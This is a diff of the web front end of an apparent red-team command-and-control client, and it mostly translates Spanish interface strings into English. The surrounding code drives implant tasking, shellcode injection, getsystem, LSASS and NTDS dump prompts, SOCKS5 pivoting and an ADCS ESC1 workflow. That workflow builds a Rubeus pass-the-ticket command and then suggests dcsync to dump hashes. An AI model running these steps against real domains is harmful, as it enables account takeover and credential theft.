@@ -658,7 +658,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
           </div>
           <!-- mini-map hint -->
           <div id="graph-hint" style="position:absolute;bottom:10px;right:14px;font-size:10px;color:var(--text3);pointer-events:none">
-            Drag nodes · Pan con click + arrastrar fondo · Scroll = zoom · Dbl-click = reset
+            Drag nodes · Pan: click+drag background · Scroll = zoom · Dbl-click = reset
           </div>
         </div>
         <div id="agents-table-wrap" class="panel">
@@ -1579,7 +1579,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                   <select id="dlv-artifact" style="flex:1;background:var(--bg2);border:1px solid var(--border);border-radius:4px;color:var(--text1);font-size:12px;padding:5px 8px">
                     <option value="">— select a payload —</option>
                   </select>
-                  <button class="btn btn-ghost btn-sm" onclick="dlvRefreshArtifacts()" title="Recargar lista">↺</button>
+                  <button class="btn btn-ghost btn-sm" onclick="dlvRefreshArtifacts()" title="Reload list">↺</button>
                 </div>
               </div>
             </div>
@@ -2306,16 +2306,16 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
     <div class="tab-panel" id="tab-operator">
       <div class="toolbar">
         <span style="color:var(--accent);font-weight:600;font-size:13px">⚡ Operator Terminal</span>
-        <span style="color:var(--text3);font-size:11px;margin-left:12px">Kali-local — certipy · impacket · bloodhound · nxc · nmap · cualquier herramienta</span>
+        <span style="color:var(--text3);font-size:11px;margin-left:12px">Kali-local — certipy · impacket · bloodhound · nxc · nmap · any tool</span>
         <div class="spacer"></div>
-        <button class="btn btn-ghost btn-sm" onclick="opHistToggle()" title="Historial de comandos">📋 History</button>
+        <button class="btn btn-ghost btn-sm" onclick="opHistToggle()" title="Command history">📋 History</button>
         <button class="btn btn-ghost btn-sm" onclick="opTermClear()">🗑 Clear</button>
       </div>
       <!-- History panel (hidden by default) -->
       <div id="op-history-panel" style="display:none;flex-shrink:0;max-height:220px;overflow-y:auto;border-bottom:1px solid var(--border);background:var(--bg3)">
         <div style="display:flex;align-items:center;gap:8px;padding:6px 12px;border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--bg3);z-index:1">
           <span style="font-size:11px;color:var(--text3);font-weight:600">HISTORY</span>
-          <input id="op-hist-filter" placeholder="filtrar…" oninput="opHistRender()"
+          <input id="op-hist-filter" placeholder="filter…" oninput="opHistRender()"
             style="flex:1;font-family:var(--font-mono);font-size:11px;background:var(--bg4);border:1px solid var(--border2);border-radius:3px;padding:2px 6px;color:var(--text);outline:none">
           <button class="btn btn-ghost btn-sm" onclick="opHistClear()" style="font-size:10px;opacity:.7" title="Clear history">✕ Clear</button>
           <button class="btn btn-ghost btn-sm" onclick="opHistToggle()" style="font-size:12px;opacity:.7">✕</button>
@@ -2620,11 +2620,11 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
           <span id="plugin-status" style="color:var(--text3);font-size:11px"></span>
         </div>
         <div class="panel">
-          <div class="panel-header"><span class="panel-title">Módulos instalados</span></div>
+          <div class="panel-header"><span class="panel-title">Installed modules</span></div>
           <div class="panel-body" style="overflow-x:auto">
             <table id="plugins-table">
-              <thead><tr><th>Módulo</th><th>Tipo</th><th>Versión</th><th>Permisos</th><th>Estado</th><th>Acciones</th></tr></thead>
-              <tbody><tr><td colspan="6" style="padding:14px;color:var(--text3)">Abre Settings → Plugins para descubrir módulos.</td></tr></tbody>
+              <thead><tr><th>Module</th><th>Type</th><th>Version</th><th>Permissions</th><th>Status</th><th>Actions</th></tr></thead>
+              <tbody><tr><td colspan="6" style="padding:14px;color:var(--text3)">Open Settings → Plugins to discover modules.</td></tr></tbody>
             </table>
           </div>
         </div>
@@ -2632,9 +2632,9 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
           <div class="panel-header" style="display:flex;justify-content:space-between;align-items:center">
             <span class="panel-title" id="plugin-output-title">Plugin output</span>
             <div style="display:flex;gap:6px;align-items:center">
-              <button class="btn btn-ghost btn-sm" id="plugin-export-html" style="display:none" onclick="exportPluginReport('html','__output__')" title="Exportar HTML">⬇ HTML</button>
-              <button class="btn btn-ghost btn-sm" id="plugin-export-csv"  style="display:none" onclick="exportPluginReport('csv','__output__')"  title="Exportar CSV">📋 CSV</button>
-              <button class="btn btn-ghost btn-sm" id="plugin-export-pdf"  style="display:none" onclick="exportPluginReport('pdf','__output__')"  title="Imprimir/PDF">🖨 PDF</button>
+              <button class="btn btn-ghost btn-sm" id="plugin-export-html" style="display:none" onclick="exportPluginReport('html','__output__')" title="Export HTML">⬇ HTML</button>
+              <button class="btn btn-ghost btn-sm" id="plugin-export-csv"  style="display:none" onclick="exportPluginReport('csv','__output__')"  title="Export CSV">📋 CSV</button>
+              <button class="btn btn-ghost btn-sm" id="plugin-export-pdf"  style="display:none" onclick="exportPluginReport('pdf','__output__')"  title="Print/PDF">🖨 PDF</button>
               <button class="btn btn-ghost btn-sm" onclick="document.getElementById('plugin-output-panel').style.display='none'">✕</button>
             </div>
           </div>
@@ -2645,11 +2645,11 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
       <!-- ── Marketplace ── -->
       <div id="plsubtab-marketplace" style="display:none;flex-direction:column;gap:10px;padding:10px">
         <div style="display:flex;align-items:center;gap:8px;padding-bottom:6px;border-bottom:1px solid var(--border)">
-          <button class="btn btn-ghost btn-sm" onclick="marketplaceRefresh()">↻ Actualizar</button>
+          <button class="btn btn-ghost btn-sm" onclick="marketplaceRefresh()">↻ Update</button>
           <span id="marketplace-status" style="color:var(--text3);font-size:11px"></span>
         </div>
         <div id="marketplace-list">
-          <div style="padding:14px;color:var(--text3);font-size:12px">Haz clic en Actualizar para cargar los plugins disponibles.</div>
+          <div style="padding:14px;color:var(--text3);font-size:12px">Click Update to load available plugins.</div>
         </div>
       </div>
     </div>
@@ -2812,7 +2812,7 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
       <div style="font-size:12px;color:#fff;letter-spacing:.5px;margin-bottom:4px;font-weight:700">Made with AI, thought and directed by a human.</div>
       <div style="font-family:var(--font-mono);font-size:14px;font-weight:700;letter-spacing:1px;text-align:center">by <span style="color:var(--accent)">x25s</span></div>
       <div style="margin-top:28px;font-size:10px;color:var(--text3);opacity:.5;letter-spacing:1px">
-        USO EXCLUSIVAMENTE AUTORIZADO
+        AUTHORIZED USE ONLY
       </div>
     </div>
   </div>
@@ -2821,10 +2821,10 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
 <!-- Confirm dialog -->
 <div class="modal-overlay" id="modal-confirm" style="display:none">
   <div class="modal" style="max-width:360px">
-    <div class="modal-header"><span class="modal-title" id="confirm-title">Confirmar</span></div>
+    <div class="modal-header"><span class="modal-title" id="confirm-title">Confirm</span></div>
     <div class="modal-body"><p id="confirm-msg" style="color:var(--text2);margin:0;line-height:1.6;font-size:13px"></p></div>
     <div class="modal-footer">
-      <button class="btn btn-ghost" onclick="closeModal('modal-confirm')">Cancelar</button>
+      <button class="btn btn-ghost" onclick="closeModal('modal-confirm')">Cancel</button>
       <button class="btn btn-danger" id="confirm-ok-btn">Aceptar</button>
     </div>
   </div>
@@ -3054,12 +3054,12 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
       <div>
         <div style="font-size:10px;font-weight:600;color:var(--text2);margin-bottom:4px;text-transform:uppercase;letter-spacing:.08em">Args / Comando</div>
         <pre id="tl-exp-args" style="background:var(--bg1);border:1px solid var(--border);border-radius:4px;padding:10px 12px;font-family:var(--font-mono);font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:180px;overflow-y:auto;margin:0;color:var(--text)"></pre>
-        <button onclick="navigator.clipboard.writeText(document.getElementById('tl-exp-args').textContent)" style="background:none;border:none;cursor:pointer;color:var(--text3);font-size:10px;padding:2px 0;margin-top:3px" title="Copiar">⧉ Copiar args</button>
+        <button onclick="navigator.clipboard.writeText(document.getElementById('tl-exp-args').textContent)" style="background:none;border:none;cursor:pointer;color:var(--text3);font-size:10px;padding:2px 0;margin-top:3px" title="Copy">⧉ Copy args</button>
       </div>
       <div>
         <div style="font-size:10px;font-weight:600;color:var(--text2);margin-bottom:4px;text-transform:uppercase;letter-spacing:.08em">Output</div>
         <pre id="tl-exp-output" style="background:var(--bg1);border:1px solid var(--border);border-radius:4px;padding:10px 12px;font-family:var(--font-mono);font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:320px;overflow-y:auto;margin:0;color:var(--text)"></pre>
-        <button onclick="navigator.clipboard.writeText(document.getElementById('tl-exp-output').textContent)" style="background:none;border:none;cursor:pointer;color:var(--text3);font-size:10px;padding:2px 0;margin-top:3px" title="Copiar">⧉ Copiar output</button>
+        <button onclick="navigator.clipboard.writeText(document.getElementById('tl-exp-output').textContent)" style="background:none;border:none;cursor:pointer;color:var(--text3);font-size:10px;padding:2px 0;margin-top:3px" title="Copy">⧉ Copy output</button>
       </div>
       <div id="tl-exp-error-row" style="display:none">
         <div style="font-size:10px;font-weight:600;color:var(--red);margin-bottom:4px;text-transform:uppercase;letter-spacing:.08em">Error</div>
@@ -3067,7 +3067,7 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
       </div>
     </div>
     <div class="modal-footer">
-      <button class="btn btn-ghost" onclick="closeModal('modal-tl-expand')">Cerrar</button>
+      <button class="btn btn-ghost" onclick="closeModal('modal-tl-expand')">Close</button>
     </div>
   </div>
 </div>
@@ -3266,16 +3266,16 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
         <input id="socks5-port" type="number" value="1080" min="1" max="65535" style="width:120px">
       </div>
       <div class="form-row">
-        <label style="display:flex;flex-direction:column;gap:2px">Autenticación <span style="font-size:10px;color:var(--text3);font-weight:400">(RFC 1929, opcional; Go)</span></label>
+        <label style="display:flex;flex-direction:column;gap:2px">Authentication <span style="font-size:10px;color:var(--text3);font-weight:400">(RFC 1929, optional; Go)</span></label>
         <div style="display:flex;gap:6px">
-          <input id="socks5-user" type="text" placeholder="usuario" autocomplete="off" style="width:110px">
-          <input id="socks5-pass" type="text" placeholder="contraseña" autocomplete="off" style="flex:1">
+          <input id="socks5-user" type="text" placeholder="username" autocomplete="off" style="width:110px">
+          <input id="socks5-pass" type="text" placeholder="password" autocomplete="off" style="flex:1">
         </div>
       </div>
     </div>
     <div class="modal-footer">
-      <button class="btn btn-ghost" onclick="closeModal('modal-socks5')">Cancelar</button>
-      <button class="btn btn-primary" onclick="socks5StartConfirm()">▶ Iniciar</button>
+      <button class="btn btn-ghost" onclick="closeModal('modal-socks5')">Cancel</button>
+      <button class="btn btn-primary" onclick="socks5StartConfirm()">▶ Start</button>
     </div>
   </div>
 </div>
@@ -3294,7 +3294,7 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
       </div>
     </div>
     <div class="modal-footer">
-      <button class="btn btn-ghost" onclick="closeModal('modal-prompt')">Cancelar</button>
+      <button class="btn btn-ghost" onclick="closeModal('modal-prompt')">Cancel</button>
       <button class="btn btn-primary" id="prompt-ok-btn">OK</button>
     </div>
   </div>
@@ -3303,7 +3303,7 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
 <!-- Choice modal (N action buttons) -->
 <div class="modal-overlay" id="modal-choice" style="display:none">
   <div class="modal" style="max-width:400px">
-    <div class="modal-header"><span class="modal-title" id="choice-title">Confirmar</span></div>
+    <div class="modal-header"><span class="modal-title" id="choice-title">Confirm</span></div>
     <div class="modal-body"><p id="choice-msg" style="color:var(--text2);margin:0;line-height:1.6;font-size:13px"></p></div>
     <div class="modal-footer" id="choice-footer"></div>
   </div>
@@ -3331,7 +3331,7 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
       </div>
     </div>
     <div class="modal-footer">
-      <button class="btn btn-ghost" onclick="closeModal('modal-portscan')">Cancelar</button>
+      <button class="btn btn-ghost" onclick="closeModal('modal-portscan')">Cancel</button>
       <button class="btn btn-primary" onclick="_portScanSubmit()">Scan</button>
     </div>
   </div>
@@ -3350,7 +3350,7 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
     </div>
     <div class="modal-footer">
       <button class="btn btn-ghost btn-sm" onclick="openInjectModal(_injectCtx?.agentId,_injectCtx?.mode,_injectCtx?.pid)" style="margin-right:auto">↻ Refresh</button>
-      <button class="btn btn-ghost" onclick="closeModal('modal-inject')">Cancelar</button>
+      <button class="btn btn-ghost" onclick="closeModal('modal-inject')">Cancel</button>
     </div>
   </div>
 </div>
@@ -3385,8 +3385,8 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
       </div>
     </div>
     <div class="modal-footer">
-      <button class="btn btn-ghost" onclick="closeModal('modal-exec')">Cancelar</button>
-      <button class="btn btn-primary" onclick="execModalRun()" style="gap:6px">▶ Ejecutar</button>
+      <button class="btn btn-ghost" onclick="closeModal('modal-exec')">Cancel</button>
+      <button class="btn btn-primary" onclick="execModalRun()" style="gap:6px">▶ Run</button>
     </div>
   </div>
 </div>
@@ -3400,13 +3400,13 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
     </div>
     <div class="modal-body">
       <div class="form-row">
-        <label>Sleep (segundos)</label>
+        <label>Sleep (seconds)</label>
         <input id="sleep-sec-input" type="number" min="1" value="60">
       </div>
       <div class="form-row">
-        <label>Jitter (segundos)</label>
+        <label>Jitter (seconds)</label>
         <input id="sleep-jitter-input" type="number" min="0" value="12">
-        <small style="color:var(--text3);font-size:10px">delay aleatorio ± este valor</small>
+        <small style="color:var(--text3);font-size:10px">random delay ± this value</small>
       </div>
     </div>
     <div class="modal-footer">
@@ -3918,7 +3918,7 @@ async function runCtxAction(act) {
         // misses this beacon, the operator can still enter the domain below.
         const result = await awaitTaskResult(queued.data.task_id, agentID, 10000);
         const domain = bhCleanDomain(result?.output, agentID);
-        if (domain) addConsoleOutputForAgent(agentID, `[+] Dominio AD detectado: ${domain}`, '', null);
+        if (domain) addConsoleOutputForAgent(agentID, `[+] AD domain detected: ${domain}`, '', null);
         return domain;
       } catch (_) {
         return '';
@@ -4015,30 +4015,30 @@ async function runCtxAction(act) {
       const aid = act.id || activeAgent?.id; if (!aid) break;
       const r = await api('GET', '/api/uploads');
       const files = (r?.data || []).filter(f => f.agent_id === aid && f.filename?.toLowerCase().endsWith('.zip'));
-      if (files.length === 0) { toast('No hay ZIPs en uploads para este agente', 'orange'); break; }
+      if (files.length === 0) { toast('No ZIP files in uploads for this agent', 'orange'); break; }
       const sorted = files.slice().sort((a,b) => (b.created_at||'').localeCompare(a.created_at||''));
-      showQuickForm('Importar BloodHound ZIP', [
-        {key:'filename', label:'Archivo ZIP', type:'select', options: sorted.map(f => ({v: f.filename, l: f.filename})), def: sorted[0].filename},
+      showQuickForm('Import BloodHound ZIP', [
+        {key:'filename', label:'ZIP file', type:'select', options: sorted.map(f => ({v: f.filename, l: f.filename})), def: sorted[0].filename},
       ], async vals => {
         if (!vals.filename) return;
         const ir = await api('POST', '/api/bloodhound/import-local', {agent_id: aid, filename: vals.filename});
-        if (ir?.ok) { toast(`BloodHound importado: ${ir.data.nodes} nodos, ${ir.data.edges} aristas`, 'green'); bhInit(); }
-        else toast('Error al importar: ' + (ir?.error || 'error'), 'red');
+        if (ir?.ok) { toast(`BloodHound imported: ${ir.data.nodes} nodes, ${ir.data.edges} edges`, 'green'); bhInit(); }
+        else toast('Error importing: ' + (ir?.error || 'error'), 'red');
       });
       break;
     }
 
     case 'bhAutoImport': {
       const aid = act.id || activeAgent?.id; if (!aid) break;
-      toast('Buscando ZIPs de SharpHound...', 'blue');
+      toast('Searching for SharpHound ZIPs...', 'blue');
       const r = await api('GET', '/api/uploads');
       const files = (r?.data || []).filter(f => f.agent_id === aid && f.filename?.toLowerCase().endsWith('.zip'));
-      if (files.length === 0) { toast('No hay ZIPs en uploads para este agente', 'orange'); break; }
+      if (files.length === 0) { toast('No ZIP files in uploads for this agent', 'orange'); break; }
       const sorted = files.slice().sort((a,b) => (b.created_at||'').localeCompare(a.created_at||''));
       const latest = sorted[0];
       const ir = await api('POST', '/api/bloodhound/import-local', {agent_id: aid, filename: latest.filename});
-      if (ir?.ok) { toast(`BloodHound auto-importado: ${ir.data.nodes} nodos, ${ir.data.edges} aristas (${latest.filename})`, 'green'); bhInit(); }
-      else toast('Error al auto-importar: ' + (ir?.error || 'error'), 'red');
+      if (ir?.ok) { toast(`BloodHound auto-imported: ${ir.data.nodes} nodes, ${ir.data.edges} edges (${latest.filename})`, 'green'); bhInit(); }
+      else toast('Error auto-importing: ' + (ir?.error || 'error'), 'red');
       break;
     }
 
@@ -4085,14 +4085,14 @@ async function runCtxAction(act) {
       const ag = agents.find(a => a.id === aid);
       const defDomain = (ag?.username||'').includes('\\') ? ag.username.split('\\')[0].toLowerCase() : '';
       showQuickForm('ADCS ESC1 → DA (certreq + Rubeus)', [
-        {key:'ca',       label:'CA — formato FQDN\\\\Nombre-CA',         ph:'ca.north.local\\\\north-CA',       def:''},
-        {key:'template', label:'Template vulnerable (ESC1)',              ph:'User',                              def:'User'},
-        {key:'san',      label:'SAN — upn del usuario a impersonar',     ph:'administrator@north.local',        def:`administrator@${defDomain}`},
-        {key:'subject',  label:'Subject (CN del cert, cualquier valor)', ph:ag?.hostname||'pwned',              def:ag?.hostname||'pwned'},
-        {key:'dc',       label:'DC IP o hostname (para Rubeus asktgt)',  ph:'10.10.10.10',                      def:''},
-        {key:'domain',   label:'Dominio (para Rubeus)',                  ph:'north.local',                      def:defDomain},
+        {key:'ca',       label:'CA — FQDN\\\\CA-Name format',             ph:'ca.north.local\\\\north-CA',       def:''},
+        {key:'template', label:'Vulnerable template (ESC1)',              ph:'User',                              def:'User'},
+        {key:'san',      label:'SAN — UPN of user to impersonate',        ph:'administrator@north.local',        def:`administrator@${defDomain}`},
+        {key:'subject',  label:'Subject (cert CN, any value)',            ph:ag?.hostname||'pwned',              def:ag?.hostname||'pwned'},
+        {key:'dc',       label:'DC IP or hostname (for Rubeus asktgt)',   ph:'10.10.10.10',                      def:''},
+        {key:'domain',   label:'Domain (for Rubeus)',                     ph:'north.local',                      def:defDomain},
       ], vals => {
-        if (!vals.ca || !vals.san || !vals.dc) { toast('CA, SAN y DC son obligatorios', 'red'); return; }
+        if (!vals.ca || !vals.san || !vals.dc) { toast('CA, SAN and DC are required', 'red'); return; }
         // Step 1: native ADCS_REQUEST task
         const arArgs = JSON.stringify({
           ca: vals.ca,
@@ -4106,11 +4106,11 @@ async function runCtxAction(act) {
         // Step 2: show Rubeus command to use after cert arrives
         const rubeusCmd = `asktgt /certificate:C:\\Users\\Public\\esc1.pfx /password: /domain:${vals.domain} /dc:${vals.dc} /nowrap /ptt`;
         setTimeout(() => {
-          showInfoModal('ADCS ESC1 — Paso 2: Rubeus asktgt',
-            `El agente solicitará el certificado. Cuando aparezca el resultado con <b>cert_b64=</b>, ejecuta en el mismo agente:\n\n` +
+          showInfoModal('ADCS ESC1 — Step 2: Rubeus asktgt',
+            `The agent will request the certificate. When the result with <b>cert_b64=</b> appears, run on the same agent:\n\n` +
             `<code style="display:block;background:var(--bg3);padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;font-size:.82em">execute-assembly Rubeus.exe ${rubeusCmd}</code>\n\n` +
-            `Esto solicitará un TGT como <b>${esc(vals.san)}</b> e inyectará el ticket (/ptt).\n` +
-            `Después: <code>token whoami</code> para verificar, <code>dcsync</code> para volcar hashes.`
+            `This will request a TGT as <b>${esc(vals.san)}</b> and inject the ticket (/ptt).\n` +
+            `Then: <code>token whoami</code> to verify, <code>dcsync</code> to dump hashes.`
           );
         }, 800);
       });
@@ -4557,7 +4557,7 @@ async function runCtxAction(act) {
       if (privAct === 'getsystem') {
         const r = await api('POST', `/api/agents/${aid}/task`, {type:'GETSYSTEM', args:''});
         if (r?.ok) {
-          toast('⚡ getsystem enviado — esperando resultado…');
+          toast('⚡ getsystem sent — waiting for result…');
           if (!activeAgent || activeAgent.id !== aid) openConsoleFor(aid);
           pollResult(r.data?.task_id, aid);
         }
@@ -4820,7 +4820,7 @@ function showSubTabProg(group, name) {
 }
 
 function deleteAgent(agentId) {
-  showConfirm('Eliminar agente', `¿Eliminar el registro del agente ${agentId.substring(0,8)} de la base de datos?`, async () => {
+  showConfirm('Delete agent', `Delete agent record ${agentId.substring(0,8)} from the database?`, async () => {
     const r = await api('DELETE', `/api/agents/${agentId}/delete`);
     if (r?.ok) { toast('Agent deleted'); refreshAgents(); }
   });
@@ -4931,7 +4931,7 @@ async function psKill(pid) {
 }
 async function psInject(pid, name) {
   if (!psAgentId) return;
-  showChoice(`Inject → ${name} (PID ${pid})`, 'Selecciona el método de inyección:', [
+  showChoice(`Inject → ${name} (PID ${pid})`, 'Select injection method:', [
     {label:'💉 Shellcode (RemoteThread)', onClick: () => openInjectModal(psAgentId, 'remote', String(pid))},
     {label:'⚡ APC Early-Bird',           onClick: () => openInjectModal(psAgentId, 'apc',    String(pid))},
   ]);
@@ -5269,8 +5269,8 @@ function agentContextMenu(e, agentId) {
         null,
         {label:'Custom collection…',    action:{fn:'bloodhoundCustom', id}},
         null,
-        {label:'⚡ Auto-importar último ZIP',  action:{fn:'bhAutoImport',        id}},
-        {label:'📥 Importar ZIP de uploads…',  action:{fn:'bhImportFromUploads', id}},
+        {label:'⚡ Auto-import latest ZIP',  action:{fn:'bhAutoImport',        id}},
+        {label:'📥 Import ZIP from uploads…',  action:{fn:'bhImportFromUploads', id}},
       ]},
       {_sub:'ADCS (Certify)', _icon:IC_CERT, items:[
         {label:'Find vulnerable templates',   action:{fn:'certifyFind', id, vulnerable:true}},
@@ -5471,10 +5471,10 @@ async function checkClientVersion() {
     const code = s => `<code style="background:rgba(0,0,0,.3);padding:1px 5px;border-radius:3px;color:#fff">${esc(s)}</code>`;
     const kbd  = s => `<kbd style="background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.3);padding:1px 6px;border-radius:3px;color:#fff">${esc(s)}</kbd>`;
     bar.innerHTML =
-      `<span>⚠ Nueva versión disponible — commit ${code(d.current_commit)} ` +
+      `<span>⚠ New version available — commit ${code(d.current_commit)} ` +
       `(este cliente: ${code(d.build_commit)}). ` +
       `Ejecuta ${kbd('make client')} y reinicia c2-client.</span>` +
-      `<button id="eg-update-dismiss" style="margin-left:auto;background:none;border:1px solid rgba(255,255,255,.4);color:#fef3c7;cursor:pointer;border-radius:4px;padding:2px 10px;font-size:11px;flex-shrink:0">× Cerrar</button>`;
+      `<button id="eg-update-dismiss" style="margin-left:auto;background:none;border:1px solid rgba(255,255,255,.4);color:#fef3c7;cursor:pointer;border-radius:4px;padding:2px 10px;font-size:11px;flex-shrink:0">× Close</button>`;
     document.body.prepend(bar);
     document.getElementById('eg-update-dismiss').addEventListener('click', () => {
       sessionStorage.setItem('eg_ver_dismissed', d.current_commit);
@@ -5627,7 +5627,7 @@ async function doLogin() {
       initApp();
     } else {
       BASE = prevBASE; TOKEN = prevTOKEN;
-      showLoginErr('Token inválido — ' + JSON.stringify(r));
+      showLoginErr('Invalid token — ' + JSON.stringify(r));
     }
   } catch(e) {
     BASE = prevBASE; TOKEN = prevTOKEN;
@@ -5645,11 +5645,11 @@ function applyTheme(name) {
   if (name === 'light') {
     document.documentElement.setAttribute('data-theme', 'light');
     const btn = document.getElementById('theme-toggle');
-    if (btn) { btn.textContent = '☀'; btn.title = 'Cambiar a tema oscuro'; }
+    if (btn) { btn.textContent = '☀'; btn.title = 'Switch to dark theme'; }
   } else {
     document.documentElement.setAttribute('data-theme', 'dark');
     const btn = document.getElementById('theme-toggle');
-    if (btn) { btn.textContent = '🌙'; btn.title = 'Cambiar a tema claro'; }
+    if (btn) { btn.textContent = '🌙'; btn.title = 'Switch to light theme'; }
   }
 }
 function toggleTheme() {
@@ -5828,12 +5828,12 @@ function bhShowImportPrompt(ev) {
     div.id = id;
     div.style.cssText = 'position:fixed;bottom:80px;right:20px;z-index:9999;background:var(--bg2);border:1px solid var(--accent);border-radius:8px;padding:14px 18px;max-width:340px;box-shadow:0 4px 16px rgba(0,0,0,.4)';
     div.innerHTML = `
-      <div style="font-weight:600;margin-bottom:6px;color:var(--accent)">SharpHound ZIP detectado</div>
+      <div style="font-weight:600;margin-bottom:6px;color:var(--accent)">SharpHound ZIP detected</div>
       <div style="font-size:.85em;margin-bottom:10px;word-break:break-all;opacity:.85">${esc(filename)}</div>
-      <div style="font-size:.82em;margin-bottom:12px;opacity:.7">${esc(String(nodes))} nodos · ${esc(String(edges))} aristas</div>
+      <div style="font-size:.82em;margin-bottom:12px;opacity:.7">${esc(String(nodes))} nodes · ${esc(String(edges))} edges</div>
       <div style="display:flex;gap:8px">
-        <button data-bh-import style="flex:1;background:var(--accent);color:#000;border:none;border-radius:5px;padding:6px 0;cursor:pointer;font-weight:600">Importar</button>
-        <button data-bh-dismiss style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 0;cursor:pointer">Descartar</button>
+        <button data-bh-import style="flex:1;background:var(--accent);color:#000;border:none;border-radius:5px;padding:6px 0;cursor:pointer;font-weight:600">Import</button>
+        <button data-bh-dismiss style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 0;cursor:pointer">Dismiss</button>
       </div>`;
     div.querySelector('[data-bh-import]').addEventListener('click', () => bhImportLocal(agent_id, filename, id));
     div.querySelector('[data-bh-dismiss]').addEventListener('click', () => document.getElementById(id)?.remove());
@@ -5844,18 +5844,18 @@ function bhShowImportPrompt(ev) {
 
 async function bhImportLocal(agentId, filename, promptId) {
   document.getElementById(promptId)?.remove();
-  toast('Importando BloodHound...', 'blue');
+  toast('Importing BloodHound...', 'blue');
   try {
     const r = await api('POST', '/api/bloodhound/import-local', {agent_id: agentId, filename});
     if (r.ok) {
-      toast(`BloodHound importado: ${r.data.nodes} nodos, ${r.data.edges} aristas`, 'green');
+      toast(`BloodHound imported: ${r.data.nodes} nodes, ${r.data.edges} edges`, 'green');
       bhRefreshFiles();
       if (document.getElementById('tab-bloodhound')?.classList.contains('active')) bhInit();
     } else {
-      toast('Error al importar: ' + (r.error || 'desconocido'), 'red');
+      toast('Error importing: ' + (r.error || 'unknown'), 'red');
     }
   } catch(e) {
-    toast('Error al importar: ' + e.message, 'red');
+    toast('Error importing: ' + e.message, 'red');
   }
 }
 
@@ -5874,8 +5874,8 @@ function showLsassPrompt(ev) {
       <div style="font-size:.85em;margin-bottom:8px;word-break:break-all;opacity:.85">${esc(filename)}</div>
       <div style="font-size:.8em;background:var(--bg3);border-radius:4px;padding:6px 8px;margin-bottom:10px;font-family:monospace;word-break:break-all">${esc(cmd)}</div>
       <div style="display:flex;gap:8px">
-        <a href="${dl}" download="${esc(filename)}" style="flex:1;background:var(--red);color:#fff;border:none;border-radius:5px;padding:6px 0;cursor:pointer;font-weight:600;text-align:center;text-decoration:none;font-size:.85em">Descargar</a>
-        <button onclick="navigator.clipboard.writeText(${JSON.stringify(cmd)});toast('Copiado','blue')" style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 0;cursor:pointer;font-size:.85em">Copiar cmd</button>
+        <a href="${dl}" download="${esc(filename)}" style="flex:1;background:var(--red);color:#fff;border:none;border-radius:5px;padding:6px 0;cursor:pointer;font-weight:600;text-align:center;text-decoration:none;font-size:.85em">Download</a>
+        <button onclick="navigator.clipboard.writeText(${JSON.stringify(cmd)});toast('Copied','blue')" style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 0;cursor:pointer;font-size:.85em">Copy cmd</button>
         <button onclick="document.getElementById('${id}')?.remove()" style="background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 10px;cursor:pointer">✕</button>
       </div>`;
     document.body.appendChild(div);
@@ -5897,7 +5897,7 @@ function showNtdsPrompt(ev) {
       <div style="font-size:.85em;margin-bottom:6px;opacity:.85">${esc(filename)} — espera ntds.dit + SYSTEM</div>
       <div style="font-size:.8em;background:var(--bg3);border-radius:4px;padding:6px 8px;margin-bottom:10px;font-family:monospace;word-break:break-all">${esc(cmd)}</div>
       <div style="display:flex;gap:8px">
-        <button onclick="navigator.clipboard.writeText(${JSON.stringify(cmd)});toast('Copiado','blue')" style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 0;cursor:pointer;font-size:.85em">Copiar cmd</button>
+        <button onclick="navigator.clipboard.writeText(${JSON.stringify(cmd)});toast('Copied','blue')" style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 0;cursor:pointer;font-size:.85em">Copy cmd</button>
         <button onclick="document.getElementById('${id}')?.remove()" style="background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:6px 10px;cursor:pointer">✕</button>
       </div>`;
     document.body.appendChild(div);
@@ -5949,7 +5949,7 @@ async function api(method, path, body, raw=false) {
   let json;
   try { json = await resp.json(); } catch { json = null; }
   if (resp.status === 401 && json?.error === 'unauthorized') {
-    if (TOKEN) { doLogout(); toast('Sesión expirada — vuelve a conectarte', 'error', 4000); }
+    if (TOKEN) { doLogout(); toast('Session expired — please reconnect', 'error', 4000); }
   }
   return json;
 }
@@ -6473,8 +6473,8 @@ function renderPluginResult(result) {
         <td style="padding:5px 8px;font-size:10px;color:var(--text3);white-space:nowrap">${esc(p.lastLogon||'')}</td>
       </tr>`;
     }).join('');
-    parts.push(sectionTable('USUARIOS', users.length,
-      ['Usuario','Activo','Flags','Descripción','Último logon'], rows));
+    parts.push(sectionTable('USERS', users.length,
+      ['User','Active','Flags','Description','Last logon'], rows));
   }
 
   // ── Computers ──────────────────────────────────────────────────────────────
@@ -6490,8 +6490,8 @@ function renderPluginResult(result) {
         <td style="padding:5px 8px;font-size:10px;color:var(--text3);white-space:nowrap">${esc(p.lastLogon||'')}</td>
       </tr>`;
     }).join('');
-    parts.push(sectionTable('EQUIPOS', computers.length,
